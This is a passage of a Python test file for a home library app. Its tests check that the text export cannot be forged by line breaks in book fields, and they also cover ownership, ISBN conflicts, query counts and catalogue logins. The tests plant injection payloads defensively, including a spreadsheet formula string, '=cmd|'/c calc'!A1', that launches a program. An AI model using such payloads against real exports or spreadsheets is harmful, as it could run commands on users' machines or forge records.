    """A payload into one `BookCreate` string field, over HTTP.

    That schema bounds these four on length and does nothing else to them:
    measured against it with no database, each stores all ten line breaks
    unchanged.
    """

    def plant(admin, make_book, db, payload: str) -> None:
        make_book(admin["headers"], **{field: payload})

    return plant


def _plant_past_the_door(column: str):
    """A payload into one column of `books` through the ORM.

    **The door is why this write exists rather than an HTTP one.** `isbn` is
    check digited and rewritten to thirteen digits at the API and `year` is an
    int the schema bounds, so an HTTP arm for either would be refused by that
    door and would pass with `_one_line` deleted. `backup._parse_row` inserts a
    restored archive through Core, where no Pydantic model and no `@validates`
    hook fires and SQLite is dynamically typed, which is the write this
    reproduces and the argument `docs/decisions.md` records for removing the
    CSV export's exemption set entirely. `Year` was one of the four names in it.
    """

    def plant(admin, make_book, db, payload: str) -> None:
        row = db.get(Book, make_book(admin["headers"])["id"])
        setattr(row, column, payload)
        db.commit()

    return plant


def _plant_in_a_tag_name(admin, make_book, db, payload: str) -> None:
    """Through the ORM for the same reason, and a measured one.

    `TagCreate.tidy` runs `" ".join(value.split())` on the name already, so a
    tag invented through the API cannot carry a break: measured, all ten come
    back flattened from that schema alone. `importing.Import` and
    `backup._parse_row` are the writes that are not that door.
    """
    row = db.get(Book, make_book(admin["headers"])["id"])
    row.tags.append(Tag(name=payload, category=TagCategory.CUSTOM))
    db.commit()


def _plant_in_the_name_of_whoever_added_it(admin, make_book, db, payload: str) -> None:
    r"""The forged field is also a way in, which is the one the report missed.

    `UserCreate` bounds the username at 50 and asks `^\S.*$` of it. That refuses
    a newline, because `.` does not match one, and **admits the other nine**:
    measured against the schema with no database, `mallory<break>Added By: x` is
    accepted and stored unchanged for every break but `\n`. A directory sign in
    mints a username from an attribute this app never sees at all. Written
    through the ORM so the arm is about the export rather than about
    registration's rate limiter.
    """
    db.get(User, admin["user"]["id"]).username = payload
    db.commit()
    make_book(admin["headers"])


#: How each attacked line of the record is given an attacker's payload, keyed by
#: the label the writer puts in front of it.
#:
#: **The arms are parametrised off this and the partition below reads its
#: keys**, so deleting an arm takes its label out of the attacked set instead of
#: leaving a literal behind that says the label is still covered. The first
#: version of that partition held the six labels as a set literal, which is the
#: enumeration this whole class exists to stop, one level up.
_PLANTERS = {
    "Title": _plant_through_book_create("title"),
    "Author": _plant_through_book_create("author"),
    "Publisher": _plant_through_book_create("publisher"),
    "Description": _plant_through_book_create("description"),
    "ISBN": _plant_past_the_door("isbn"),
    "Year": _plant_past_the_door("year"),
    "Tags": _plant_in_a_tag_name,
    "Added By": _plant_in_the_name_of_whoever_added_it,
}

#: The lines of the record no arm here plants a break in, and what refuses the
#: break rather than what makes it impossible.
#:
#: **Not a safety claim, and not the shape `docs/decisions.md` refused.** That
#: register killed the CSV export's exempt set because it excused a **value**
#: from the escape on a door a restored archive walks around. Nothing here is
#: excused from `_one_line`: the `ast` guard above puts every one of the ten
#: through it.
#:
#: **A Core write reaches both of these columns**, so "there is no column to
#: put a break into" is the wrong reason and stating it would be the tell
#: `guards-and-mutation` names: defensible code beside a reason a reviewer
#: agrees with. `user_books.status` is a `String(20)` and `books.added_at` is a
#: `DateTime` over dynamically typed SQLite, so a restored archive puts text in
#: either. What stops a forged line is the **read** side: measured,
#: `ReadStatus("x\nAdded By: mallory")` raises `ValueError` and so does the
#: `DateTime` result processor, so such a row 500s the export instead of
#: writing an attacker's line into it. A planter here would assert a traceback,
#: which is a different test about a different failure.
_NOT_DRIVEN_HERE = {
    "My Status": "`ReadStatus(row.status)` raises on anything but a member",
    "Date Added": "the `DateTime` result processor raises on a non-isoformat string",
}

#: What every arm below plants. Nineteen characters, which is inside every
#: attacked column's declared width, `books.isbn` at `String(ISBN_MAX)` being
#: the narrowest at 20.
#:
#: **Staying inside it is tidiness and not a guard**, which is worth saying
#: because the obvious claim, that a wider payload would make the ISBN arm pass
#: on the width, is false at both ends: SQLite does not enforce a VARCHAR
#: length and `books.isbn` carries no `CheckConstraint` and no `@validates`, so
#: a 28 character value stores and the arm still goes red for the right reason;
#: and on the Postgres spelling the model also carries, an over-width insert
#: raises rather than truncating, so it would go red loudly.
_FORGERY = "x\nAdded By: mallory"

#: `_FORGERY` as the export must render it: one line, one space where the break
#: was. Asserted beside the "one `Added By:` line" check, because a fix that
#: dropped the value, or truncated it at the break, satisfies that check alone.
_FORGERY_FLATTENED = "x Added By: mallory"


class TestTheTextExportCannotBeMadeToForgeALine:
    """The other half: what `_one_line` does, rather than where it is called.

    A record in this format is `Label: value` per line, so a value carrying a
    newline is a value that can write a line. `Added By:` is the field that
    names who owns a row, and the CSV importer refuses to read that column back
    precisely because of what it claims.
    """

    def _export(self, client, admin) -> str:
        res = client.get(
            "/api/books/export", params={"format": "txt"}, headers=admin["headers"]
        )
        assert res.status_code == 200
        return res.text

    def _lines_opening(self, exported: str, label: str) -> list[str]:
        """The lines that **begin** with a label, which is the whole claim.

        Counting the substring anywhere counts it inside a flattened value too,
        and that is not a forgery: `Description: ok Added By: mallory` is one
        field saying so, which is what flattening leaves. What a reader parses
        is the start of a line.
        """
        return [line for line in exported.splitlines() if line.startswith(label)]

    def test_the_sweep_still_finds_every_break_it_found_when_it_was_measured(self):
        r"""A sweep matching nothing parametrises every arm in this class into
        no cases at all and reports green, which is the failure mode of driving
        a test off a derived list.

        A narrowed sweep is the same failure one step along and is the one
        worth an assertion, because it looks like a simplification: a predicate
        rewritten as `chr(cp) in "\n\r\x0b\x0c\x85\u2028\u2029"` returns seven
        of the ten, drops the file, group and record separators, and narrows
        every arm below with it. `_BREAKS_AS_MEASURED` is the floor that catches
        that, for the reason recorded beside it.
        """
        missing = [
            hex(ord(char)) for char in _BREAKS_AS_MEASURED if char not in _LINE_BREAKS
        ]
        assert missing == [], (
            f"{missing} broke a line when this was measured and the sweep no "
            "longer finds them, so every arm in this class just got narrower."
        )

    def test_one_line_removes_every_line_break_there_is(self):
        """The claim `_one_line` rests on, re-derived on every run.

        It removes whitespace, and every character that breaks a line is
        whitespace, so this holds by construction rather than by coincidence.
        It is still asserted, for two reasons that are not the same: both sets
        belong to Python and can move under this code, and the rewrite that
        narrows `_one_line` to the breaks it can name passes every HTTP arm
        below whose character it happened to name. Measured: that rewrite,
        naming the five characters this class used to drive, was caught by
        nothing before this arm and by six arms after it.
        """
        survived = [
            hex(ord(char))
            for char in _LINE_BREAKS
            if len(books_router._one_line(f"a{char}b").splitlines()) > 1
        ]
        assert survived == [], (
            f"{survived} survive `_one_line`, so a value carrying one of them "
            "still opens a line of its own in the export."
        )

    @pytest.mark.parametrize(
        "line_break", _LINE_BREAKS, ids=[hex(ord(char)) for char in _LINE_BREAKS]
    )
    def test_no_line_break_can_open_a_second_added_by_line(
        self, client, admin, make_book, line_break
    ):
        r"""One arm per break, derived, so the set the arms cover and the set
        `_one_line` claims cannot drift apart.

        This used to name five characters and so did `_one_line`'s docstring,
        which is one enumeration checked against itself. `\r` alone is a line
        break to a Windows editor and to Excel, U+2028 is one to
        `str.splitlines()`, and `BookCreate` stores all ten unchanged: measured
        against the schema with no database, title, author, publisher and
        description are 10 of 10. So every arm really does reach the writer.
        """
        make_book(
            admin["headers"],
            title="Dune",
            description=f"A good read.{line_break}Added By: mallory"
            f"{line_break}Description: and mine",
        )

        exported = self._export(client, admin)

        assert self._lines_opening(exported, "Added By:") == ["Added By: admin"]
        assert len(self._lines_opening(exported, "Description:")) == 1, exported

    def test_the_words_of_a_description_survive_on_their_line(
        self, client, admin, make_book
    ):
        """The loss is the paragraph break and nothing else. A fix that dropped
        the value, or truncated it at the newline, would pass the test above
        and silently empty every multi line description in the library."""
        make_book(admin["headers"], title="Dune", description="First.\nSecond.")

        exported = self._export(client, admin)

        assert "Description: First. Second." in exported

    @pytest.mark.parametrize("label", sorted(_PLANTERS))
    def test_no_value_on_the_record_can_open_a_line(
        self, client, admin, db, make_book, label
    ):
        """Not only the description, which is the one the report named.

        Eight of the ten lines carry a stored value, and each is its own way in.
        Four take a string straight off `BookCreate`; the other four are behind
        a door that refuses the payload or rewrites it, so those are written the
        way `backup._parse_row` writes a restored archive. `_PLANTERS` carries
        which is which and why, one docstring per planter.

        **One `Added By:` line, not one equal to `Added By: admin`.** The
        `Added By` arm forges through the adding member's own name, so the line
        that survives there is the flattened username rather than a fixed
        string, and an assertion naming `admin` would have had to exempt the one
        arm most worth driving.
        """
        _PLANTERS[label](admin, make_book, db, _FORGERY)

        exported = self._export(client, admin)

        assert len(self._lines_opening(exported, "Added By:")) == 1, exported
        assert _FORGERY_FLATTENED in exported, (
            f"the {label} arm planted nothing the export carries, so it would "
            "pass with `_one_line` deleted."
        )

    def test_every_label_on_the_record_is_attacked_or_named_as_not_attacked(self):
        """A partition over the writer's own labels, so a line added to that
        record lands in neither set and fails here.

        The arms above are a list of ways in, and a list written once against a
        record that keeps growing is the shape that goes quietly short. This is
        what stops it: the labels come from `_export_text_lines`, which reads
        the handler, the attacked half is `_PLANTERS`, which the arms are
        parametrised over, and `_NOT_DRIVEN_HERE` has to carry a reason for
        every label left.

        **Reading `_PLANTERS` rather than a set literal is the half that was
        wrong first.** With the six labels written out here, deleting an arm
        left its label in the literal and this stayed green, which is the same
        enumeration the sweep above exists to remove, one level up.
        """
        labels = {label.removesuffix(": ") for label, _ in _export_text_lines()}

        assert not (_PLANTERS.keys() & _NOT_DRIVEN_HERE.keys())
        assert _PLANTERS.keys() | _NOT_DRIVEN_HERE.keys() == labels, (
            f"{labels - _PLANTERS.keys() - _NOT_DRIVEN_HERE.keys()} are lines of "
            "the txt record that no arm here plants a line break in and that "
            "nothing says why. Give it a planter, or name it in "
            "`_NOT_DRIVEN_HERE` with what refuses the break on the read side."
        )

    def test_a_forged_line_cannot_begin_with_a_formula_lead(
        self, client, admin, make_book
    ):
        """The spreadsheet half of the same defect. Excel's text import reads
        this file, and a line beginning `=` is a formula. Flattening closes it
        by construction: every line now begins with a label, so no value this
        app writes reaches the start of one."""
        make_book(admin["headers"], title="Dune", description="ok\n=cmd|'/c calc'!A1")

        exported = self._export(client, admin)

        assert [line for line in exported.splitlines() if line.startswith("=")] == []

    def test_two_books_are_still_two_records(self, client, admin, make_book):
        """The bound on the rule: the blank line between records is the one
        newline this format keeps, and a fix that flattened the whole file
        would pass every test above."""
        make_book(admin["headers"], title="Dune")
        make_book(admin["headers"], title="Emma")

        exported = self._export(client, admin)

        assert len(self._lines_opening(exported, "Title:")) == 2
        assert "\n\n" in exported


class TestOwnership:
    """Whether a copy is physically on the shelf.

    Separate from reading status on purpose: "I have read this" and "we own a
    copy" are independent claims. A library borrowing is read and not owned; an
    unread gift is owned and not read.
    """

    def test_a_scanned_book_is_owned(self, client, admin, make_book):
        # The ordinary way a book arrives is somebody scanning the barcode on
        # its back cover, which means they were holding it.
        assert make_book(admin["headers"])["ownership"] == "owned"

    def test_a_client_that_cannot_establish_ownership_says_so(self, client, admin):
        # **The store import is the route this exists for.** An Adobe Digital
        # Editions catalogue records a three week library loan and a purchase
        # identically, and the loan lives in the fulfilment token beside the
        # book file, which this app does not open. So a client reading one
        # cannot claim ownership and now has a way to say that.
        res = client.post(
            "/api/books",
            json={"title": "Borrowed Or Bought", "ownership": "unknown"},
            headers=admin["headers"],
        )

        assert res.status_code == 201
        assert res.json()["ownership"] == "unknown"

    def test_omitting_it_still_means_owned(self, client, admin):
        # The bound on the arm above, and the reason it is a bound rather than
        # a restatement: every client that predates the field sends nothing,
        # and the default has to keep meaning what it meant. A change that made
        # absence mean `unknown` would silently unclaim every scanned book.
        res = client.post(
            "/api/books",
            json={"title": "Sent By An Older Client"},
            headers=admin["headers"],
        )

        assert res.status_code == 201
        assert res.json()["ownership"] == "owned"

    def test_it_refuses_a_status_that_is_not_one(self, client, admin):
        # The column carries a CHECK constraint, so a value past it would be a
        # 500 rather than a refusal. Asserted at the door.
        res = client.post(
            "/api/books",
            json={"title": "Nonsense Status", "ownership": "borrowed"},
            headers=admin["headers"],
        )

        assert res.status_code == 422

    def test_the_owner_can_mark_it_not_owned(self, client, admin, make_book):
        book = make_book(admin["headers"])

        res = client.patch(
            f"/api/books/{book['id']}/ownership",
            json={"ownership": "not_owned"},
            headers=admin["headers"],
        )

        assert res.status_code == 200
        assert res.json()["ownership"] == "not_owned"

    def test_any_member_may_confirm_a_public_book(self, client, admin, member, make_book):
        # A shared shelf: whoever notices the book is there can say so.
        book = make_book(admin["headers"])

        res = client.patch(
            f"/api/books/{book['id']}/ownership",
            json={"ownership": "unknown"},
            headers=member["headers"],
        )

        assert res.status_code == 200

    def test_another_member_cannot_touch_a_private_book(
        self, client, admin, member, make_book
    ):
        book = make_book(admin["headers"], is_private=True)

        res = client.patch(
            f"/api/books/{book['id']}/ownership",
            json={"ownership": "owned"},
            headers=member["headers"],
        )

        assert res.status_code == 404

    def test_an_unknown_ownership_value_is_rejected(self, client, admin, make_book):
        book = make_book(admin["headers"])

        res = client.patch(
            f"/api/books/{book['id']}/ownership",
            json={"ownership": "borrowed-from-mum"},
            headers=admin["headers"],
        )

        assert res.status_code == 422

    def test_the_listing_can_be_filtered_by_ownership(self, client, admin, make_book):
        # The query the whole bulk-confirmation flow is built around.
        owned = make_book(admin["headers"], title="On The Shelf")
        wanted = make_book(admin["headers"], title="Only Read It")
        client.patch(
            f"/api/books/{wanted['id']}/ownership",
            json={"ownership": "unknown"},
            headers=admin["headers"],
        )

        found = items(
            client.get("/api/books", params={"ownership": "unknown"}, headers=admin["headers"])
        )

        assert [book["title"] for book in found] == ["Only Read It"]
        assert owned["id"] not in {book["id"] for book in found}


class TestTheDuplicateConflictPointsAtTheBook:
    """Re-scanning a book already on the shelf is not a rare mistake, it is
    what happens on a second pass through a bookcase."""

    ISBN = "9780441013593"

    def test_it_carries_the_id_of_the_book_that_holds_the_isbn(
        self, client, admin, make_book
    ):
        existing = make_book(admin["headers"], title="Dune", isbn=self.ISBN)

        res = client.post(
            "/api/books",
            json={"title": "Dune", "author": "Frank Herbert", "isbn": self.ISBN},
            headers=admin["headers"],
        )

        assert res.status_code == 409
        assert res.json()["detail"]["book_id"] == existing["id"]

    def test_the_message_is_still_there(self, client, admin, make_book):
        make_book(admin["headers"], title="Dune", isbn=self.ISBN)

        res = client.post(
            "/api/books",
            json={"title": "Dune", "isbn": self.ISBN},
            headers=admin["headers"],
        )

        assert "already" in res.json()["detail"]["message"]

    def test_no_part_of_the_body_carries_another_members_private_book_id(
        self, client, admin, member, make_book
    ):
        """The uniqueness check sees every row, private ones included, so
        returning the id would turn a 409 into a way to confirm that a member
        owns a particular book.

        Asserted over every leaf of the body rather than over the shape of
        `detail`, so a field added beside `message` later has to keep the
        promise too. The message is identical in both cases, so a test reading
        that passes whether or not the id travels.
        """
        holder = make_book(
            admin["headers"], title="A diary", isbn=self.ISBN, is_private=True
        )

        res = client.post(
            "/api/books",
            json={"title": "Dune", "isbn": self.ISBN},
            headers=member["headers"],
        )

        assert res.status_code == 409
        assert holder["id"] not in leaves(res.json())
        assert str(holder["id"]) not in leaves(res.json())
        # The leaves are whole scalars, so an id interpolated into a sentence
        # would pass them. The message is a constant carrying no digit, which
        # is what makes this arm safe as well as strictly stronger.
        assert str(holder["id"]) not in res.text

    def test_only_the_id_is_withheld_and_the_two_bodies_stay_tellable_apart(
        self, client, admin, member, make_book
    ):
        """What `_conflict_detail` promises, and the thing it does not promise.

        A caller can see which case it got: one body is a string and the other
        an object. Concealing that is not available anyway, because the 409
        itself says the ISBN is held whatever the body carries.
        """
        make_book(admin["headers"], title="A diary", isbn=self.ISBN, is_private=True)
        hidden = client.post(
            "/api/books",
            json={"title": "Dune", "isbn": self.ISBN},
            headers=member["headers"],
        )

        mine = make_book(admin["headers"], title="Dune", isbn="9780261102217")
        shown = client.post(
            "/api/books",
            json={"title": "Dune again", "isbn": "9780261102217"},
            headers=admin["headers"],
        )

        assert hidden.json()["detail"] == shown.json()["detail"]["message"]
        assert shown.json()["detail"]["book_id"] == mine["id"]

    def test_your_own_private_book_is_still_pointed_at(
        self, client, admin, make_book
    ):
        """It is your book. Withholding it here would be protecting you from
        yourself and leaving you with the dead end."""
        existing = make_book(admin["headers"], title="A diary", isbn=self.ISBN, is_private=True)

        res = client.post(
            "/api/books",
            json={"title": "Dune", "isbn": self.ISBN},
            headers=admin["headers"],
        )

        assert res.json()["detail"]["book_id"] == existing["id"]


class TestTheCostOfAListing:
    """`GET /api/books` costs the same whatever the page holds.

    **The N+1 this repository keeps meeting, on the route that meets it most.**
    `serialisation.books_to_out` states the breakdown and pins its own 7 with a
    test; the end to end 11 was a measurement in the same docstring that nothing
    checked, which is the condition under which every number in this tree has
    eventually been wrong. `tests/routers/test_loans.py` already asserts the
    equivalent figure for both loan routes, exactly, after the same class of
    defect, so the books listing was the odd one out.
    """

    def _shelf_of(self, make_book, owner: dict, count: int, start: int = 0) -> None:
        """Books added by somebody who is not the caller.

        **That is the condition the cost depends on, not decoration.**
        `serialisation.books_to_out` says so: the caller's own row is already in
        the request's session, because the auth dependency put it there before
        the handler touched a book, so books the caller added cost nothing for
        `added_by` whether the eager load is there or not. Measured with
        `joinedload(Book.added_by)` removed in process: 13 selects when another
        member wrote them against 12 when the caller did. A fixture that had the
        caller write its own books would leave a mutation half visible.

        A distinct `author` string per book as well, so nothing is shared that
        could make a per row cost look constant.
        """
        for index in range(start, start + count):
            make_book(owner["headers"], title=f"Cost {index}", author=f"Author {index}")

    def test_a_page_of_books_costs_the_same_whatever_its_length(
        self, client, admin, member, make_book
    ):
        """Two lengths, and an exact number rather than a ceiling.

        **A ceiling cannot see the regression it exists for.** The loans twin
        asserted `<= 12` and went on passing with an eager load deleted and the
        count down at 11: a smaller count is a weaker inequality. An equality
        fails when a statement is added **and** when one is removed, and moving
        it is allowed when the change is deliberate and measured.

        **No `expunge_all`, and its absence is measured rather than assumed.**
        Each request gets a fresh `SessionLocal`, so the request's identity map
        starts empty however full the test's own session is; adding the call
        would be a setup line nobody could show was doing anything. What makes
        the eager load observable is the fixture above, not a session reset.

        What it pins, measured 2026-08-30 by removing the option in process:
        `Loading.SERIALISED`'s `joinedload(Book.added_by)`. Dropping it is
        **+1**, 11 to 12, one member for the whole page rather than one per
        book, because `books_to_out` already re-reads the page for its own
        relationships. The number is stated once, in `books_to_out`, and
        deliberately not broken down here: this repository has restated that
        breakdown wrongly twice, both times by editing prose rather than
        measuring.
        """
        self._shelf_of(make_book, member, 5)
        short_cost, short_total = selects_for(client, admin["headers"], "/api/books")

        self._shelf_of(make_book, member, 20, start=5)
        long_cost, long_total = selects_for(client, admin["headers"], "/api/books")

        # The rows really were built, so a cost met by returning an empty page
        # cannot pass, and the two runs really do differ in length.
        assert (short_total, long_total) == (5, 25)

        assert short_cost == long_cost, (
            f"{short_cost} selects for 5 books and {long_cost} for 25: "
            "the cost moves with the page, which is the N+1 this exists to catch"
        )
        assert long_cost == 12, f"{long_cost} selects for 25 books"


class TestACatalogueLoginLeavesTheDeploymentWithItsRequest:
    """The route resolves a stored login and the catalogue receives it.

    **The end #209 was actually about.** `metadata` threading a credential is
    only half of it: nothing resolved one, so a login could be sealed, reported
    as held on the settings screen and counted as making its source ready while
    every request went out unauthenticated.
    `test_metadata.py::TestACatalogueLoginReachesTheRequestItWasStoredFor` pins
    the other half.

    **A roster with a credentialled SRU source, because the real one has none.**
    `sources.NEEDS_A_KEY` holds Google Books, which is bespoke and whose secret
    is a settings row, so on today's rows the resolver has nothing to find and a
    test against them would pass with the wiring deleted. The DNB stands in for
    the source #180 exists to add.

    **Pinned in the environment rather than sealed**, which needs no encryption
    key and no keychain: `credentials.for_request` prefers the pinned value
    anyway, so this exercises the same resolution the settings screen reports.
    """

    ISBN = "9783960092353"
    SENT = "Basic " + b64encode(b"alice:hunter2").decode()

    def _asked_the_dnb(self, mock) -> list[httpx.Request]:
        sent = [
            call.request
            for call in mock.calls
            if str(call.request.url).startswith(DNB)
        ]
        assert sent, "the DNB was never asked, so the headers say nothing"
        return sent

    def test_a_login_this_deployment_holds_reaches_the_catalogue(
        self, client, admin, dnb_hit, monkeypatch
    ):
        monkeypatch.setattr(
            sources, "NEEDS_A_KEY", frozenset({CatalogueSource.DNB})
        )
        monkeypatch.setenv(credentials.env_variable_name("dnb"), "alice:hunter2")

        res = client.get(
            "/api/books/lookup", params={"isbn": self.ISBN}, headers=admin["headers"]
        )

        assert res.status_code == 200
        for request in self._asked_the_dnb(dnb_hit):
            assert request.headers.get("authorization") == self.SENT

    def test_a_catalogue_needing_no_login_is_asked_anonymously(
        self, client, admin, dnb_hit
    ):
        """The arm that makes the one above evidence rather than a tautology.

        Nothing is patched here, so this is the roster as it ships.
        """
        res = client.get(
            "/api/books/lookup", params={"isbn": self.ISBN}, headers=admin["headers"]
        )

        assert res.status_code == 200
        for request in self._asked_the_dnb(dnb_hit):
            assert "authorization" not in request.headers

    def test_a_login_held_for_another_catalogue_reaches_nothing(
        self, client, admin, dnb_hit, monkeypatch
    ):
        """A login resolved for K10plus is not attached to the DNB's request.

        The refusal is the credential's own origin binding, reached here through
        the route, so a resolver that handed every source the same entry fails.
        K10plus is asserted to have received it, or this passes on a login that
        was never resolved at all.
        """
        monkeypatch.setattr(
            sources, "NEEDS_A_KEY", frozenset({CatalogueSource.K10PLUS})
        )
        monkeypatch.setenv(
            credentials.env_variable_name("k10plus"), "alice:hunter2"
        )

        res = client.get(
            "/api/books/lookup", params={"isbn": self.ISBN}, headers=admin["headers"]
        )

        assert res.status_code == 200
        for request in self._asked_the_dnb(dnb_hit):
            assert "authorization" not in request.headers
        asked = [
            call.request
            for call in dnb_hit.calls
            if str(call.request.url).startswith(K10PLUS)
        ]
        assert asked, "K10plus was never asked, so its login was never resolved"
        for request in asked:
            assert request.headers.get("authorization") == self.SENT


def _resolutions_counted(monkeypatch) -> list[int]:
    """A one element tally of `credentials._supplied` invocations.

    The resolver's own arms count the same thing in
    `tests/test_settings_store.py`. Counted again here because this measures a
    whole request rather than one call: that file pins what one resolution
    costs, and this pins how many a request makes.
    """
    tally = [0]
    real = credentials._supplied

    def counting():
        tally[0] += 1
        return real()

    monkeypatch.setattr(credentials, "_supplied", counting)
    return tally


class TestTheLookupRouteDoesNotPayPerSourceEither:
    """The whole request, because the resolver being right is not the route using it.

    The resolver's own arms are
    `tests/test_settings_store.py::TestTheKeyIsResolvedOncePerRequest`, where
    `_catalogue_logins` lives. Counted here is a whole lookup request, which
    includes `settings_store._sources_with_a_credential` resolving once for its
    own loop as well. What is asserted is that neither total moves with the
    roster.
    """

    def test_the_cost_of_a_lookup_does_not_move_with_the_roster(
        self, client, admin, db, dnb_hit, monkeypatch
    ):
        phrase = credentials.generate_phrase()
        monkeypatch.setenv("CREDENTIAL_ENCRYPTION_KEY", phrase)
        for name in ("dnb", "k10plus"):
            credentials.put(
                db, name, targets.SEEDED[CatalogueSource(name)].base_url, "alice", "hunter2"
            )

        counts = []
        for roster in (
            frozenset({CatalogueSource.DNB}),
            frozenset({CatalogueSource.DNB, CatalogueSource.K10PLUS}),
        ):
            monkeypatch.setattr(sources, "NEEDS_A_KEY", roster)
            tally = _resolutions_counted(monkeypatch)
            res = client.get(
                "/api/books/lookup",
                params={"isbn": TestACatalogueLoginLeavesTheDeploymentWithItsRequest.ISBN},
                headers=admin["headers"],
            )
            assert res.status_code == 200
            counts.append(tally[0])

        # **The constant and not only the slope.** Measured 2026-09-17 at two
        # apiece, which is `_catalogue_logins`' resolution plus
        # `_sources_with_a_credential`'s. Asserted as an equality because a
        # second `library_access` in a handler leaves the slope flat and moves
        # the constant, and with only the slope pinned that mutation was green.
        assert counts == [2, 2], (
            f"{counts[0]} resolutions with one credentialled source and "
            f"{counts[1]} with two, where two apiece is what one request pays: "
            "a figure that moves with the roster is a cost per source, and one "
            "that moves together is a second resolution in the handler"
        )



class TestAPatchCannotClearAColumnThatRefusesNull:
    """`{"title": null}` was `UPDATE books SET title=NULL`, and a **500**.

    SQLite refused on the NOT NULL constraint, the `IntegrityError` reached
    `errors.unhandled_exception_handler`, and a member emptying a box was told
    the application is broken over a value the form let them type.

    The rule itself is `schemas/book.COLUMNS_THAT_REFUSE_NULL`, derived from the
    table, and `tests/schemas/test_book.py` holds it over every field of every
    body a route writes this way. These three are the end to end arms: that the
    refusal arrives, that it arrives in the shape the schema declares for that
    status, and that clearing a nullable column still works.
    """

    def test_clearing_the_title_is_refused_and_the_row_is_unchanged(
        self, client, admin, make_book
    ):
        book = make_book(admin["headers"], title="Still Here")

        res = client.patch(
            f"/api/books/{book['id']}", json={"title": None}, headers=admin["headers"]
        )

        assert res.status_code == 422, res.text
        after = client.get(f"/api/books/{book['id']}", headers=admin["headers"])
        assert after.json()["title"] == "Still Here"

    def test_the_refusal_carries_the_detail_the_schema_declares(
        self, client, admin, make_book
    ):
        """`HTTPValidationError.detail` is an array of entries, and this refusal
        is FastAPI's own rather than a hand raised one, so the body matches the
        committed schema instead of contradicting it."""
        book = make_book(admin["headers"])

        res = client.patch(
            f"/api/books/{book['id']}", json={"title": None}, headers=admin["headers"]
        )

        assert isinstance(res.json()["detail"], list), res.text

    def test_a_nullable_column_still_clears(self, client, admin, make_book):
        """The other half, without which a body that refused every null would
        pass: an explicit null is still how a field gets emptied."""
        book = make_book(admin["headers"], subtitle="Or, The Whale")

        res = client.patch(
            f"/api/books/{book['id']}", json={"subtitle": None}, headers=admin["headers"]
        )

        assert res.status_code == 200, res.text
        assert res.json()["subtitle"] is None
